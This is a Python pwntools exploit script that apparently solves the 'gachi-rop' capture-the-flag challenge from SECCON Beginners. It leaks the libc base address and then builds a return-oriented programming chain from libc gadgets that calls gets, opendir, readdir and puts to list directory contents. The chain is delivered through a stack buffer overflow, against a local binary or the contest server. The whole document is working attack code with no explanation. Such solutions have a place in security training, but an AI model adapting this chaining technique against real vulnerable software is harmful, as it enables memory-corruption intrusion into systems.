from pwn import *
import sys

HOST = 'gachi-rop.beginners.seccon.games'
PORT = 4567

exe = ELF('./gachi-rop_patched')
libc = ELF('./libc.so.6')

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)  
    else:
        return process([exe.path])

io = start()

# libc base leak
io.recvuntil(b'@')
addr_libc_base = int(io.recvline(), 16) - libc.sym['system']
log.info(f'addr_libc_base = {addr_libc_base:#x}')
libc.address = addr_libc_base

# create rop chain
buf1 = 0x404000 + 0x500
buf2 = 0x404000 + 0x600

addr_rop_pop_rdi = addr_libc_base + 0x001bbea1
addr_rop_add_rax_1 = addr_libc_base + 0x000d8340
# 0x0013b649: pop rdx; pop r12; ret;
addr_rop_pop_rdx_pop_r12 = addr_libc_base + 0x0013b649
# 0x000b0fd8: mov rcx, rax; xor eax, eax; mov [rdx], rcx; ret;
addr_rop_mov_rcx_rax = addr_libc_base + 0x000b0fd8
# 0x0011d0f0: mov rsi, rcx; mov rax, rdi; mov byte ptr [rsi-1], 0; ret;
addr_rop_mov_rsi_rcx = addr_libc_base + 0x0011d0f0
# 0x001b412a: mov rdi, rsi; bsr eax, eax; lea rax, [rdi+rax-0x20]; ret;
addr_rop_mov_rdi_rsi = addr_libc_base + 0x001b412a
# 0x001348da: mov rax, r9; ret;
addr_rop_mov_rax_r9 = addr_libc_base + 0x001348da

chain = p64(addr_rop_pop_rdi)
chain += p64(buf1)
chain += p64(libc.sym['gets'])

chain += p64(addr_rop_pop_rdi)
chain += p64(buf1)
chain += p64(libc.sym['opendir'])

chain += p64(addr_rop_pop_rdx_pop_r12)
chain += p64(buf1) + p64(0)
chain += p64(addr_rop_mov_rcx_rax)
chain += p64(addr_rop_mov_rsi_rcx)
chain += p64(addr_rop_mov_rdi_rsi)
chain += p64(libc.sym['readdir'])

for _ in range(0x13):
    chain += p64(addr_rop_add_rax_1)

chain += p64(addr_rop_pop_rdx_pop_r12)
chain += p64(buf1) + p64(0)
chain += p64(addr_rop_mov_rcx_rax)
chain += p64(addr_rop_mov_rsi_rcx)
chain += p64(addr_rop_mov_rdi_rsi)
chain += p64(libc.sym['puts'])

# attack
payload = b'a' * 0x18 + chain
io.sendlineafter(b': ', payload)
io.sendline(sys.argv[1].encode())
io.recvline()
print(io.recvline())
